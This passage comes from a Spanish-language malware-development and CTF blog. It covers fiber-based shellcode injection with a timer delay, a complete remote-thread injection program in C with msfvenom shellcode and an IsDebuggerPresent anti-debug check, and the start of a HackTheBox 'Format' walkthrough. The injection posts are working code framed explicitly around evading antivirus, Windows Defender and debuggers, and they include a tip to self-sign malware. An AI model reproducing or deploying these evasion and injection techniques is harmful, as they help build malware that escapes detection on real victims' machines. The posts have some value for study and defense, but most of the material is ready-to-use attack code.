<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">UINT_PTR</span> <span class="n">timerId</span> <span class="o">=</span> <span class="n">SetTimer</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">20000</span><span class="p">,</span> <span class="p">[](</span><span class="n">HWND</span> <span class="n">hwnd</span><span class="p">,</span> <span class="n">UINT</span> <span class="n">uMsg</span><span class="p">,</span> <span class="n">UINT_PTR</span> <span class="n">idEvent</span><span class="p">,</span> <span class="n">DWORD</span> <span class="n">dwTime</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">fiber_injection</span><span class="p">();</span><span class="n">witchToFiber</span><span class="p">(</span><span class="n">shellcode_fiber</span><span class="p">);</span>
    <span class="n">KillTimer</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">idEvent</span><span class="p">);</span>
<span class="p">});</span>	

</code></pre></div></div>

<p>Dentro de los parametros de <code class="language-plaintext highlighter-rouge">SetTimer</code> le indicamos en milisegundos el tiempo que va a esperar para ejecutarse lo que se encuentre dentro, y en este caso es la llamada a la funcion <code class="language-plaintext highlighter-rouge">fiber_injection</code>, esto es una clasica implementacion de un timming attack que agrega un pequeño delay al inicio de la ejecucion del malware para evadir los antivirus</p>

<ul>
  <li>Despues tenemos un pequeño bucle declarado de esta forma:</li>
</ul>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">while</span> <span class="p">(</span><span class="n">GetMessage</span><span class="p">(</span><span class="o">&amp;</span><span class="n">msg</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)){</span>	
    	<span class="n">TranslateMessage</span><span class="p">(</span><span class="o">&amp;</span><span class="n">msg</span><span class="p">);</span>
    	<span class="n">DispatchMessage</span><span class="p">(</span><span class="o">&amp;</span><span class="n">msg</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Donde con <code class="language-plaintext highlighter-rouge">GetMessage</code> le estamos diciendo que se siga ejecutando hasta que reciba una señal de salida, esa señal de salida se manda a llamar desde <code class="language-plaintext highlighter-rouge">TranslateMessage</code> y <code class="language-plaintext highlighter-rouge">DispatchMessage</code>, esto se usa por que debemos de procesar los mensajes, y con ayuda de esas funciones, la fibra esta respondiendo a los mensajes recibidos y manteniendo la ejecución en curso.</p>

<p>Asi que toda la funcion <code class="language-plaintext highlighter-rouge">VOID CALLBACK shellcode_routine</code> implementa una funcion de callback para hacer un timming attack en la fibra de la shellcode.</p>

<hr />

<h2 id="funcion-main">Funcion Main</h2>

<p>A este punto ya solo nos queda mandar a llamar a la funcion <code class="language-plaintext highlighter-rouge">main()</code>,</p>

<ul>
  <li>Lo primero que tenemos en el main son dos funciones que lo que hacen es ocultar la ventana del cmd que se abre al ejecutar el binario:</li>
</ul>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">HWND</span> <span class="n">ventana_cmd</span> <span class="o">=</span> <span class="n">GetConsoleWindow</span><span class="p">();</span>
<span class="n">ShowWindow</span><span class="p">(</span><span class="n">ventana_cmd</span><span class="p">,</span> <span class="n">SW_HIDE</span><span class="p">);</span>
</code></pre></div></div>

<ul>
  <li>Despues se esta conviertiendo el hilo principal en una fibra:</li>
</ul>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">LPVOID</span> <span class="n">main_fiber</span> <span class="o">=</span> <span class="n">ConvertThreadToFiber</span><span class="p">(</span><span class="nb">NULL</span><span class="p">);</span>
</code></pre></div></div>
<p>Esto con el fin de cambiar de contexto entre las fibras</p>

<ul>
  <li>La funcion que sigue crea una fibra donde el segundo parametro es el callback creado anteriormente:</li>
</ul>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">LPVOID</span> <span class="n">shellcode_fiber</span> <span class="o">=</span> <span class="n">CreateFiber</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">shellcode_routine</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
</code></pre></div></div>

<ul>
  <li>Despues ejecuta la fibra creada anteriormente:</li>
</ul>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">witchToFiber</span><span class="p">(</span><span class="n">shellcode_fiber</span><span class="p">);</span>
</code></pre></div></div>

<ul>
  <li>Y por ultimo ejecuta la fibra principal</li>
</ul>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">SwitchToFiber</span><span class="p">(</span><span class="n">main_fiber</span><span class="p">);</span>
</code></pre></div></div>

<p>Como te daras cuenta, se ejecutan 3 fibras</p>

<ul>
  <li>La fibra principal</li>
  <li>La fibra de la shellcode que manda a llamar al callback <code class="language-plaintext highlighter-rouge">shellcode_routine</code></li>
  <li>Y la fibra de la funcion <code class="language-plaintext highlighter-rouge">fiber_injection</code>, yo la llamo la <code class="language-plaintext highlighter-rouge">fibra comodin</code></li>
</ul>

<p>Ahora te preguntaras “¿Por que 3 fibras, si solo una es la que inyecta la shellcode?”, pues ahi te va la explicacion de por que las 3 fibras evaden los antivirus</p>

<p>Las 3 fibras se usan de la siguiente manera, cuando en el main se ejecuta la primera fibra que manda a llamar a <code class="language-plaintext highlighter-rouge">shellcode_routine</code>, lo que va a pasar es que entrara a la funcion callback y esperara 20 segundos para ejecutar la <code class="language-plaintext highlighter-rouge">fibra comodin</code>, mientras que a su vez en el main se hace un llamado para ejectutar otra fibra, que es la fibra principal (main_fiber), y lo que estaria pasando es que la fibra que mando a llamar a <code class="language-plaintext highlighter-rouge">shellcode_routine</code> y la <code class="language-plaintext highlighter-rouge">main_fiber</code> se estarian ejecutandose en contextos diferentes, permitiendo que la ejecucion de la <code class="language-plaintext highlighter-rouge">fibra comidin</code> pase desapercibida por los antivirus ocultando su actividad e inyectando la shellcode mientras que el programa sigue fluyendo normalmente ejecutandose en el hilo principal mediante la <code class="language-plaintext highlighter-rouge">main_fiber</code>, asi que los antivirus lo unico que estarian detectando es la <code class="language-plaintext highlighter-rouge">main_fiber</code> que no tiene un comportamiendo extraño, Genial, ¿No?.</p>

<h4 id="resultados">Resultados</h4>

<p>0/26 antiscan.me - Fecha: 15 de junio del 2023</p>

<p><img src="/assets/img/bypassAV_fiber/antiscanme.png" alt="" /></p>

<p>Bypass Windows defender:</p>

<video src="/assets/img/bypassAV_fiber/poc.mp4" controls="controls" width="720"></video>

<h4 id="mejoras-rapidas">Mejoras rapidas</h4>

<p>Aun que el defender no lo haya detectado, es evidente que se puede mejorar para evitar la deteccion cuando se descarga e intenta ejecutar un software desconocido, es decir, cuando no tiene ninguna firma de un certificado de autenticidad, para evadir eso, puedes firmar el malware generando un certificado tu mismo</p>

<p>Eso ha sido todo, gracias por leer ❤</p>

<p><img src="/assets/img/bypassAV_fiber/waifu.gif" alt="" /></p>]]></content><author><name>c4rta</name></author><category term="MalDev" /><summary type="html"><![CDATA[Desarrollaremos un programa en C++ para inyectar una shellcode cifrada con XOR, ademas evadiremos los antivirus usando la tecnica Fiber Injection y un Timming Attack]]></summary></entry><entry><title type="html">Inyeccion de shellcode via CreateRemoteThread + IsDebuggerPresent</title><link href="http://localhost:4000/maldev/2023/06/15/maldev-createRemoteThread.html" rel="alternate" type="text/html" title="Inyeccion de shellcode via CreateRemoteThread + IsDebuggerPresent" /><published>2023-06-15T00:00:00-06:00</published><updated>2023-06-15T00:00:00-06:00</updated><id>http://localhost:4000/maldev/2023/06/15/maldev-createRemoteThread</id><content type="html" xml:base="http://localhost:4000/maldev/2023/06/15/maldev-createRemoteThread.html"><![CDATA[<p>Que onda, esta vez que voy a enseñar a como puedes inyectar una shellcode en un proceso remoto usando CreateRemoteThread, o como tambien se le conoce a la tecnica “Remote Thread Injection”, ademas veremos una tecnica AntiDBG muy basica para evadir los depuradores</p>

<h2 class="lead" id="remote-thread-injection">Remote Thread Injection</h2>

<p>La tecnica mas basica de inyeccion de procesos, hace uso de <code class="language-plaintext highlighter-rouge">CreateRemoteThread</code> para crear un hilo en el proceso objetivo para que ejecute la shellcode.</p>

<p>Esta tecnica en caso de que se use usando la API estandar de windows (WinAPI o Win32) consta de 4 funciones, <code class="language-plaintext highlighter-rouge">OpenProcess</code>, <code class="language-plaintext highlighter-rouge">VirtualAllocEx</code>, <code class="language-plaintext highlighter-rouge">WriteProcessMemory</code> y <code class="language-plaintext highlighter-rouge">CreateRemoteThread</code>, y al usar la WinAPI, obvio tiene sus desventajas las mas obvia, es que es detectada por la mayoria de AV/EDR, sin embargo, create otro post de como aplicar esta misma tecnica usando la API nativa para poder evadir algunos de ellos.</p>

<h3 id="como-funciona">¿Como funciona?</h3>

<p>Como primer paso tenemos que se hace uso de la funcion <code class="language-plaintext highlighter-rouge">OpenProcess</code> para abrir el proceso objetivo, donde los parametros que recibe son:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">HANDLE</span> <span class="nf">OpenProcess</span><span class="p">(</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span> <span class="n">DWORD</span> <span class="n">dwDesiredAccess</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span> <span class="n">BOOL</span>  <span class="n">bInheritHandle</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span> <span class="n">DWORD</span> <span class="n">dwProcessId</span>
<span class="p">);</span>
</code></pre></div></div>

<ul>
  <li>
    <p><strong>dwDesiredAccess</strong>: con que acceso queremos abrir el proceso</p>
  </li>
  <li>
    <p><strong>bInheritHandle</strong>: Un boolean que indica si los procesos creados por el proceso “padre” heredaran el identificador</p>
  </li>
  <li>
    <p><strong>dwProcessId</strong>: El identificador del proceso que se va a abrir</p>
  </li>
</ul>

<p>Esta funcion retorna el identificador del proceso que se abrio</p>

<center><img src="/assets/img/remote_thread_injection/1.png" width="400" height="341" /></center>
<p><br /></p>

<hr />

<p>Como segundo paso, y una vez que tengamos abierto el proceso, necesitamos asignar un buffer de memoria para nuestra shellcode usando <code class="language-plaintext highlighter-rouge">VirtualAllocEx</code>, cabe destacar que esta memoria se asigna en el VAS (Virtual Adress Space) los parametros que recibe son:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">LPVOID</span> <span class="nf">VirtualAllocEx</span><span class="p">(</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span>           <span class="n">HANDLE</span> <span class="n">hProcess</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">,</span> <span class="n">optional</span><span class="p">]</span> <span class="n">LPVOID</span> <span class="n">lpAddress</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span>           <span class="n">SIZE_T</span> <span class="n">dwSize</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span>           <span class="n">DWORD</span>  <span class="n">flAllocationType</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span>           <span class="n">DWORD</span>  <span class="n">flProtect</span>
<span class="p">);</span>
</code></pre></div></div>

<ul>
  <li>
    <p><strong>hProcess</strong>: Es el identificador del proceso donde se asignara el buffer de memoria, este identificador es el que regresa la funcion <code class="language-plaintext highlighter-rouge">OpenProcess</code></p>
  </li>
  <li>
    <p><strong>lpAddress</strong>: Es la direccion de memoria desde donde se va a empezar a asignar el buffer de memoria, en caso de que sea <code class="language-plaintext highlighter-rouge">NULL</code> es por que el sistema operativo lo va a hacer</p>
  </li>
  <li>
    <p><strong>dwSize</strong>: Es el tamaño en bytes de la memoria a asignar, regularmente es al tamaño de la shellcode o de lo que se desea inyectar</p>
  </li>
  <li>
    <p><strong>flAllocationType</strong>: Se refiere al tipo de asignacion que queremos, aqui hay muchas opciones, asi que te recomiendo que las veas <a href="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex#parameters">aqui</a></p>
  </li>
  <li>
    <p><strong>flProtect</strong>: Es la proteccion que tendra la asignacion de memoria, para nuestro caso usaremos <code class="language-plaintext highlighter-rouge">PAGE_EXECUTE_READWRITE</code> para que tenga permisos de lectura, escritura y ejecucion</p>
  </li>
</ul>

<p>Esta funcion retorna la direccion base de donde se asigno el buffer de memoria</p>

<center><img src="/assets/img/remote_thread_injection/2.png" width="400" height="341" /></center>
<p><br /></p>

<hr />

<p>Como tercer paso, y una vez que se asigno un buffer de memoria para nuestra shellcode, necesitamos escribirla a ese lugar, asi que usamos <code class="language-plaintext highlighter-rouge">WriteProcessMemory()</code>, los parametros son:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">BOOL</span> <span class="nf">WriteProcessMemory</span><span class="p">(</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span>  <span class="n">HANDLE</span>  <span class="n">hProcess</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span>  <span class="n">LPVOID</span>  <span class="n">lpBaseAddress</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span>  <span class="n">LPCVOID</span> <span class="n">lpBuffer</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span>  <span class="n">SIZE_T</span>  <span class="n">nSize</span><span class="p">,</span>
  <span class="p">[</span><span class="n">out</span><span class="p">]</span> <span class="n">SIZE_T</span>  <span class="o">*</span><span class="n">lpNumberOfBytesWritten</span>
<span class="p">);</span>
</code></pre></div></div>

<ul>
  <li>
    <p><strong>hProcess</strong>: Es el identificador del proceso, el cual es el que regresa <code class="language-plaintext highlighter-rouge">OpenProcess</code></p>
  </li>
  <li>
    <p><strong>lpBaseAddress</strong>: La direccion base del buffer de memoria en donde se va a escribir la shellcode, esta direccion es la que retorna <code class="language-plaintext highlighter-rouge">VirtualAllocEx</code></p>
  </li>
  <li>
    <p><strong>lpBuffer</strong>: Un puntero al buffer el cual tiene los datos que se van a copiar, y ese es un puntero a la shellcode</p>
  </li>
  <li>
    <p><strong>nSize</strong>: Tamaño en bytes que se van a copiar, ese tamaño es el tamaño de la shellcode</p>
  </li>
  <li>
    <p><strong>lpNumberOfBytesWritten</strong>: Es una variable que recibe la cantidad de bytes que se van a transferir al proceso objetivo, es opcional y para este caso es innecesario, asi que se deja en NULL</p>
  </li>
</ul>

<p>Esta funcion simplemente regresa un valor diferente de 0 si se ejecuto correctamente</p>

<center><img src="/assets/img/remote_thread_injection/3.png" width="400" height="341" /></center>
<p><br /></p>

<hr />

<p>Como cuarto y ultimo paso, tenemos que crear un hilo en el proceso remoto el cual ejecutara la shellcode, ,los parametros son:</p>

<pre><code class="language-C">HANDLE CreateRemoteThread(
  [in]  HANDLE                 hProcess,
  [in]  LPSECURITY_ATTRIBUTES  lpThreadAttributes,
  [in]  SIZE_T                 dwStackSize,
  [in]  LPTHREAD_START_ROUTINE lpStartAddress,
  [in]  LPVOID                 lpParameter,
  [in]  DWORD                  dwCreationFlags,
  [out] LPDWORD                lpThreadId
);
</code></pre>

<ul>
  <li>
    <p><strong>hProcess</strong>: Es el identificador del proceso de donde se crear el hilo, este identificador es el de <code class="language-plaintext highlighter-rouge">OpenProcess</code></p>
  </li>
  <li>
    <p><strong>lpThreadAttributes</strong>: Son los atributos de seguridad del hilo, para este caso, se dejara en NULL para que la seguridad sea la predeterminada</p>
  </li>
  <li>
    <p><strong>dwStackSize</strong>: Es el tamaño del stack del hilo, en esta caso lo dejaremos NULL para que use el de por defecto</p>
  </li>
  <li>
    <p><strong>lpStartAddress</strong>: Es un puntero que ejecutara el hilo, usaremos por defecto <code class="language-plaintext highlighter-rouge">LPTHREAD_START_ROUTINE</code> para que se ejecute</p>
  </li>
  <li>
    <p><strong>lpParameter</strong>: Es un puntero a una variable, no hace falta asi que lo vamos a dejar en NULL</p>
  </li>
  <li>
    <p><strong>dwCreationFlags</strong>: Son unas flag que controlan la creacion del hilo, mas que nada, le dicen cuando se va a ejecutar, para este caso lo dejaremos en 0 para que el hilo se ejecute el instante de cuando se cree el hilo</p>
  </li>
  <li>
    <p><strong>lpThreadId</strong>: Es el identificador del hilo, para este caso no es necesario</p>
  </li>
</ul>

<p><img src="/assets/img/remote_thread_injection/4.png" alt="" /></p>

<p>Resumidamente seria:</p>

<p>Usamos <code class="language-plaintext highlighter-rouge">OpenProcess</code> con los permisos necesarios para abrir el proceso objetivo, despues con <code class="language-plaintext highlighter-rouge">VirtualAllocEx</code> asignamos un buffer de memoria dentro de VAS el cual va hacer usado para la shellcode, despues usamos <code class="language-plaintext highlighter-rouge">WriteProcessMemory</code> para escribir la shellcode en el buffer de memoria asignada anteriormente, y por ultimo usamos <code class="language-plaintext highlighter-rouge">CreateRemoteThread</code> para ejecutar y crear un hilo que desprendera del proceso objetivo</p>

<p>Y ese seria todo el proceso y funcionamiento de esta tecnica, como te puedes dar cuenta es muy simple pero efectiva cuando se empieza a combinar con muchas mas cosas</p>

<h2 id="anti-debug-antidbg">Anti debug (AntiDBG)</h2>

<p>Las tecnicas anti debug se usan para evadir los depuradores como OllyDbg, x64dbg, windbg, etc, esto con el fin para que el malware evite ser analizado en un depurador.</p>

<p>La tecnias ma simple que pueda existir es usar la funcion <code class="language-plaintext highlighter-rouge">IsDebuggerPresent</code>, lo que hace esta funcion es determinar si una aplicacion esta siendo ejecutada en un depurador o no para que pueda modificar su comportamiento, por detras lo que hace la funcion es checar la flag <code class="language-plaintext highlighter-rouge">BeingDebugged</code> esta activa, esta flag se encuentra en <code class="language-plaintext highlighter-rouge">Process Environment Block(PEB)</code>:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">typedef</span> <span class="k">struct</span> <span class="n">_PEB</span><span class="p">{</span>
    <span class="n">UCHAR</span> <span class="n">InheritedAddressSpace</span><span class="p">;</span>
    <span class="n">UCHAR</span> <span class="n">ReadImageFileExecOptions</span><span class="p">;</span>
    <span class="n">UCHAR</span> <span class="n">BeingDebugged</span><span class="p">;</span>
    
    <span class="p">...</span>
<span class="p">}</span>
</code></pre></div></div>

<p>la sintaxis es:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">BOOL</span> <span class="nf">IsDebuggerPresent</span><span class="p">();</span>
</code></pre></div></div>
<p>Y la podemos aplicar de esta forma</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="p">(</span><span class="n">IsDebuggerPresent</span><span class="p">()){</span> 
	<span class="c1">//si se encuentra en un depurador podemos realizar otro comportamiento que parezca inofensivo</span>
<span class="p">}</span><span class="k">else</span><span class="p">{</span>
    <span class="c1">// si no, podemos ejecutar lo que queremos, en este caso, la shellcode</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Una vez sabiendo como funcionan ambas cosas, este es codigo completo en C</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
</span>
<span class="c1">// shellcode: msfvenom -p windows/x64/exec CMD=calc.exe -f c</span>

<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
	<span class="s">"</span><span class="se">\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00</span><span class="s">"</span>
<span class="p">};</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>	

		
	<span class="k">if</span> <span class="p">(</span><span class="n">IsDebuggerPresent</span><span class="p">()){</span> 
		<span class="n">MessageBox</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="s">"ESTOY EN UN DEBUGGER &gt;_&lt;"</span><span class="p">,</span> <span class="s">"HOLA"</span><span class="p">,</span> <span class="n">MB_OK</span><span class="p">);</span> <span class="c1">//si detecta que esta en un debugger muestra una ventana con un mensaje</span>
	<span class="p">}</span><span class="k">else</span><span class="p">{</span> 
		
		<span class="n">HANDLE</span> <span class="n">hProcess</span> <span class="o">=</span> <span class="n">OpenProcess</span><span class="p">(</span>
			<span class="n">PROCESS_ALL_ACCESS</span><span class="p">,</span> 
			<span class="n">TRUE</span><span class="p">,</span>
			<span class="mi">8664</span> <span class="c1">//PID del proceso</span>
		<span class="p">);</span>
		
		<span class="kt">void</span><span class="o">*</span> <span class="n">exec_mem</span> <span class="o">=</span> <span class="n">VirtualAllocEx</span><span class="p">(</span>
			<span class="n">hProcess</span><span class="p">,</span>
			<span class="nb">NULL</span><span class="p">,</span> 
			<span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span> 
			<span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span> 
			<span class="n">PAGE_EXECUTE_READWRITE</span> 
		<span class="p">);</span>
		
		<span class="n">WriteProcessMemory</span><span class="p">(</span>
			<span class="n">hProcess</span><span class="p">,</span> 
			<span class="n">exec_mem</span><span class="p">,</span> 
			<span class="n">shellcode</span><span class="p">,</span> 
			<span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span> 
			<span class="nb">NULL</span> 
		<span class="p">);</span>
		
		<span class="n">HANDLE</span> <span class="n">hTread</span> <span class="o">=</span> <span class="n">CreateRemoteThread</span><span class="p">(</span>
			<span class="n">hProcess</span><span class="p">,</span> 
			<span class="nb">NULL</span><span class="p">,</span>
			<span class="mi">0</span><span class="p">,</span>
			<span class="p">(</span><span class="n">LPTHREAD_START_ROUTINE</span><span class="p">)</span><span class="n">exec_mem</span><span class="p">,</span> 
			<span class="nb">NULL</span><span class="p">,</span> 
			<span class="mi">0</span><span class="p">,</span> 
			<span class="mi">0</span> 
		<span class="p">);</span>
		
		<span class="n">CloseHandle</span><span class="p">(</span><span class="n">hProcess</span><span class="p">);</span>
	<span class="p">}</span>
		
	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

</code></pre></div></div>

<p>Cuando lo ejecutamos, podemos ver como se desprende un hilo del proceso donde se inyecto la shellcode, en este caso fue paint</p>

<p><img src="/assets/img/remote_thread_injection/5.png" alt="" /></p>

<p>Y si lo corremos en un debugger, muestra la ventanita de que esta en un debugger</p>

<p><img src="/assets/img/remote_thread_injection/6.png" alt="" /></p>

<p>Eso ha sido todo, gracias por leer ❤</p>

<p><img src="/assets/img/remote_thread_injection/waifu.gif" alt="" /></p>]]></content><author><name>c4rta</name></author><category term="MalDev" /><summary type="html"><![CDATA[Que onda, esta vez que voy a enseñar a como puedes inyectar una shellcode en un proceso remoto usando CreateRemoteThread, o como tambien se le conoce a la tecnica “Remote Thread Injection”, ademas veremos una tecnica AntiDBG muy basica para evadir los depuradores]]></summary></entry><entry><title type="html">HackTheBox Format - LFI, Redis y Python format string</title><link href="http://localhost:4000/hackthebox/2023/06/12/htb-format.html" rel="alternate" type="text/html" title="HackTheBox Format - LFI, Redis y Python format string" /><published>2023-06-12T00:00:00-06:00</published><updated>2023-06-12T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/2023/06/12/htb-format</id><content type="html" xml:base="http://localhost:4000/hackthebox/2023/06/12/htb-format.html"><![CDATA[<p>Tenemos un LFI en el parametro ID, que nos permitira leer archivos de configuracion de un reverse proxy, donde aprovecharemos una configuracion incorrecta de un proxy mediante una expresion, que nos permitira modificar una propiedad mediante la interacción de un socket de redis para convertirnos en “Pro”, posteriormente nos aprovecharemos otra vez de LFI donde usaremos el parametro ID para incluir un archivo PHP, y el parametro TXT para RCE</p>

<p>Para la flag de user nos volveremos a conectar por el socket a redis, para filtrar la contraseña de SSH, y para la escalada explotaremos una vulnerabilidad format string en python</p>

<h2 class="lead" id="enumeracion">Enumeracion</h2>

<p>Iniciamos con un escaneo con:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo nmap -sS -n -Pn --open -p- 10.10.11.213
</code></pre></div></div>

<ul>
  <li>
    <p>sS: haga un TCP SYN Scan el cual hace que el destino responda con un RST si el puerto esta cerrado, o con un SYN/ACK si esta abierto, y ademas para que vaya mas rapido</p>
  </li>
  <li>
    <p>n: para que no haga resolucion DNS y tarde menos el escaneo</p>
  </li>
  <li>
    <p>Pn: para evitar el descubrimiento de hosts</p>
  </li>
  <li>
    <p>open: para que solo muestre los puertos abiertos</p>
  </li>
  <li>
    <p>-p-: para que escanee todo el rango de puertos</p>
  </li>
</ul>

<p>Y nos reporto que hay varios puertos abiertos:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3000/tcp open  ppp
</code></pre></div></div>

<p>Ese puerto 3000 se ve curioso, asi que escanearemos para obtener mas informacion sobre la version y el servicio que estan corriendo:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap -sCV -p22,80,3000 10.10.11.213 
</code></pre></div></div>

<p>Vean como en el escaneo nos dice que el puerto 3000 nos redirecciona hacia <code class="language-plaintext highlighter-rouge">microblog.htb:3000/</code></p>

<p><img src="/assets/img/htb-format/1.png" alt="" /></p>

<p>Asi que lo agregamos al etc/hosts</p>

<p><code class="language-plaintext highlighter-rouge">echo "10.10.11.213     microblog.htb" | tee -a /etc/hosts</code></p>

<p>Y si accedemos por el puerto 80 nos redirecciona a <code class="language-plaintext highlighter-rouge">app.microblog.htb</code>, asi que tambien lo agregamos al etc/hosts</p>

<p><img src="/assets/img/htb-format/2.png" alt="" /></p>

<p><code class="language-plaintext highlighter-rouge">echo "10.10.11.213     app.microblog.htb" | tee -a /etc/hosts</code></p>

<p>(les puedo decir que no hace falta hacer fuzzing de directorios y tampoco enumerar subdominios).</p>

<p>Ahora visitaremos la pagina web por el puerto 80, y al mostrar su codigo fuente vemos una URL que nos lleva a otro recurso</p>

<p><img src="/assets/img/htb-format/3.png" alt="" /></p>

<p>Al entrar, vemos que corresponde a Gitea, y tambien tenemos el repositorio del proyecto</p>

<p><img src="/assets/img/htb-format/4.png" alt="" /></p>

<p>Al ver un poco el codigo fuente, vemos que nos podemos registrar y nos mandara a la ruta <code class="language-plaintext highlighter-rouge">/dashboard</code>, antes que nada, observa este codigo:</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="nv">$redis</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Redis</span><span class="p">();</span>
    <span class="nv">$redis</span><span class="o">-&gt;</span><span class="nf">connect</span><span class="p">(</span><span class="s1">'/var/run/redis/redis.sock'</span><span class="p">);</span>
